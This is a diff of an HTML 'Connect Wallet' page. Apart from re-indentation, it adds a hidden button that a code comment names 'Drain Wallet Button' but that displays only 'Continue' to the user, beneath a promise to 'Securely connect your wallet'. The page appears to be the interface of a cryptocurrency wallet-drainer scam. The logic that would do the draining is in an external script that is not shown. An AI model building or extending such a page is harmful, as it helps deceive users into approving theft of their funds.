@@ -1,29 +1,35 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <title>Connect Wallet</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="stylesheet" href="/style.css" />
-  </head>
+<head>
+  <meta charset="UTF-8" />
+  <title>Connect Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="/style.css" />
+</head>
 
-  <body>
-    <main class="container">
-      <div class="card">
-        <h1>Connect Your Wallet</h1>
-        <p class="subtitle">
-          Securely connect your wallet to continue
-        </p>
+<body>
+  <main class="container">
+    <div class="card">
+      <h1>Connect Your Wallet</h1>
+      <p class="subtitle">
+        Securely connect your wallet to continue
+      </p>
 
-        <button id="connectBtn" class="connect-btn">
-          <span class="btn-text">Connect Wallet</span>
-          <span class="spinner hidden"></span>
-        </button>
+      <button id="connectBtn" class="connect-btn">
+        <span class="btn-text">Connect Wallet</span>
+        <span class="spinner hidden"></span>
+      </button>
 
-        <div id="status" class="status"></div>
-      </div>
-    </main>
+      <div id="status" class="status"></div>
 
-    <script type="module" src="/main.js"></script>
-  </body>
+      <!-- Drain Wallet Button (hidden by default) -->
+      <button id="drainBtn" class="continue-btn hidden">
+        <span class="btn-text">Continue</span>
+        <span class="spinner hidden"></span>
+      </button>
+    </div>
+  </main>
+
+  <script type="module" src="/main.js"></script>
+</body>
 </html>
